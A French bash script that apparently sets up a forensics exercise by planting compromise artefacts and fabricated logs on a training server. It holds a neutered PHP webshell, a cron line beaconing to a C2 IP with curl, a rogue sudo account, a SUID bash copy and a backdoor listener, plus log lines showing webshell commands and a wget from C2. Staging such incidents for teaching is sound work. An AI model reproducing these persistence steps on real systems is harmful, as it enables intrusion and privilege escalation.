#!/bin/bash
# Mise en scene de l'incident. Depose des artefacts INERTES sur le serveur :
# aucune charge utile fonctionnelle, aucune connexion sortante reelle.
# Les parametres varient selon le groupe (CY3A / CY3B) pour empecher
# la reutilisation d'une reponse d'un groupe a l'autre.
set -u

GROUP="${R512_GROUP:-CY3B}"

if [ "$GROUP" = "CY3A" ]; then
    HOSTN="web-app-02"
    ATTACKER_IP="91.240.118.29"
    C2_IP="194.165.16.72"
    SHELL_PATH="/var/www/html/assets/cache.php"
    SHELL_URL="/assets/cache.php"
    BACKDOOR_PORT="39044"
    EVIL_USER="nginx-worker"
    EVIL_UID="1440"
    SUID_BIN="/usr/local/bin/.gvfsd"
    CRON_FILE="/etc/cron.d/nginx-health"
    MAL_PROC="/usr/local/bin/.gvfsd-helper"
    KEY_COMMENT="svc@nginx-worker"
else
    HOSTN="web-prod-01"
    ATTACKER_IP="45.83.121.77"
    C2_IP="185.220.101.44"
    SHELL_PATH="/var/www/html/uploads/thumb.php"
    SHELL_URL="/uploads/thumb.php"
    BACKDOOR_PORT="41122"
    EVIL_USER="www-data-svc"
    EVIL_UID="1337"
    SUID_BIN="/usr/local/bin/.dbus-cache"
    CRON_FILE="/etc/cron.d/apache-monitor"
    MAL_PROC="/usr/local/bin/.dbus-daemon"
    KEY_COMMENT="svc@www-data-svc"
fi

hostname "$HOSTN" 2>/dev/null || true
echo "$HOSTN" > /etc/hostname 2>/dev/null || true

# Fenetre temporelle de l'incident : hier, entre 02h et 03h du matin
BASE=$(date -d 'yesterday 02:14:00' '+%s' 2>/dev/null || date '+%s')
ts() { date -d "@$(( BASE + $1 ))" '+%d/%b/%Y:%H:%M:%S +0000'; }        # format Apache
tss() { date -d "@$(( BASE + $1 ))" '+%b %e %H:%M:%S'; }               # format syslog

########################################
# 0. Vieillissement du site legitime (deploiement un mois avant l'incident)
# pour que le webshell, date de l'incident, ressorte comme fichier recent.
########################################
find /var/www/html -type f -exec touch -d "@$(( BASE - 2592000 ))" {} + 2>/dev/null || true

########################################
# 1. Webshell depose via le formulaire d'upload
########################################
cat > "$SHELL_PATH" << 'PHP'
<?php
// Fichier depose par l'attaquant. Execute une commande passee en parametre.
// Rendu inoffensif pour le TP : l'appel systeme reel est neutralise.
if (isset($_REQUEST['cmd'])) {
    // system($_REQUEST['cmd']);  // ligne d'origine de l'attaquant
    echo "OK";
}
?>
PHP
chown www-data:www-data "$SHELL_PATH" 2>/dev/null || true

########################################
# 2. Persistance : compte ajoute, cle SSH, cron, binaire SUID
########################################
# Compte illegitime avec privileges sudo
useradd -u "$EVIL_UID" -o -m -s /bin/bash "$EVIL_USER" 2>/dev/null || true
usermod -aG sudo "$EVIL_USER" 2>/dev/null || true

# Cle SSH de l'attaquant (bien formee mais factice)
mkdir -p /root/.ssh && chmod 700 /root/.ssh
cat > /root/.ssh/authorized_keys << KEY
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIElJ7vQ2mR8kZpF3nX9tW5cB1yD6aH0sQ4uL2vK8jN7x $KEY_COMMENT
KEY
chmod 600 /root/.ssh/authorized_keys

# Binaire SUID root (copie de bash, artefact d'elevation de privileges)
cp /bin/bash "$SUID_BIN" 2>/dev/null || true
chmod 4755 "$SUID_BIN" 2>/dev/null || true

# Tache planifiee de persistance (le demon cron n'est pas actif : artefact fichier)
cat > "$CRON_FILE" << CRON
# Verification de sante du service web
*/10 * * * * root curl -s http://$C2_IP/beacon >/dev/null 2>&1
CRON
chmod 644 "$CRON_FILE"

########################################
# 3. Processus malveillant : porte derobee en ecoute
########################################
cat > "$MAL_PROC" << PY
#!/usr/bin/python3
# Porte derobee en ecoute. Version de TP : accepte les connexions mais
# n'execute rien. Sert uniquement de processus et de port suspects a reperer.
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", $BACKDOOR_PORT))
s.listen(5)
while True:
    try:
        c, a = s.accept()
        c.close()
    except Exception:
        time.sleep(5)
PY
chmod +x "$MAL_PROC"

########################################
# 4. Journaux Apache : trafic normal puis chaine d'attaque
########################################
AL=/var/log/apache2/access.log
{
  echo "10.20.0.15 - - [$(ts -3600)] \"GET / HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""
  echo "10.20.0.22 - - [$(ts -1800)] \"GET /gallery.php HTTP/1.1\" 200 340 \"-\" \"Mozilla/5.0\""
  # Reconnaissance : balayage de chemins (nombreux 404)
  echo "$ATTACKER_IP - - [$(ts 0)] \"GET /admin/ HTTP/1.1\" 404 209 \"-\" \"gobuster/3.6\""
  echo "$ATTACKER_IP - - [$(ts 3)] \"GET /phpmyadmin/ HTTP/1.1\" 404 209 \"-\" \"gobuster/3.6\""
  echo "$ATTACKER_IP - - [$(ts 5)] \"GET /backup.zip HTTP/1.1\" 404 209 \"-\" \"gobuster/3.6\""
  echo "$ATTACKER_IP - - [$(ts 30)] \"GET /gallery.php?page=upload HTTP/1.1\" 200 410 \"-\" \"Mozilla/5.0\""
  # Depot du webshell
  echo "$ATTACKER_IP - - [$(ts 300)] \"POST /gallery.php?page=upload HTTP/1.1\" 200 120 \"-\" \"Mozilla/5.0\""
  # Execution de commandes via le webshell
  echo "$ATTACKER_IP - - [$(ts 360)] \"GET $SHELL_URL?cmd=id HTTP/1.1\" 200 40 \"-\" \"curl/8.4.0\""
  echo "$ATTACKER_IP - - [$(ts 375)] \"GET $SHELL_URL?cmd=whoami HTTP/1.1\" 200 12 \"-\" \"curl/8.4.0\""
  echo "$ATTACKER_IP - - [$(ts 390)] \"GET $SHELL_URL?cmd=uname+-a HTTP/1.1\" 200 88 \"-\" \"curl/8.4.0\""
  # Telechargement de la seconde charge depuis le C2
  echo "$ATTACKER_IP - - [$(ts 600)] \"GET $SHELL_URL?cmd=wget+http://$C2_IP/x+-O+/tmp/x HTTP/1.1\" 200 20 \"-\" \"curl/8.4.0\""
  echo "$ATTACKER_IP - - [$(ts 900)] \"GET $SHELL_URL?cmd=id HTTP/1.1\" 200 40 \"-\" \"curl/8.4.0\""
} > "$AL"

########################################
# 5. Journal auth : creation du compte et usage de sudo
########################################
ML=/var/log/auth.log
{
  echo "$(tss 620) $HOSTN useradd[3120]: new user: name=$EVIL_USER, UID=$EVIL_UID, GID=0, home=/home/$EVIL_USER, shell=/bin/bash"
  echo "$(tss 640) $HOSTN usermod[3128]: add '$EVIL_USER' to group 'sudo'"
  echo "$(tss 700) $HOSTN sudo:   $EVIL_USER : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /bin/bash $SUID_BIN"
} > "$ML"

# Horodatage des artefacts sur la fenetre d'incident
touch -d "@$(( BASE + 300 ))" "$SHELL_PATH" 2>/dev/null || true
touch -d "@$(( BASE + 620 ))" "$SUID_BIN" "$CRON_FILE" /root/.ssh/authorized_keys 2>/dev/null || true

echo "[compromise] groupe=$GROUP hote=$HOSTN termine"
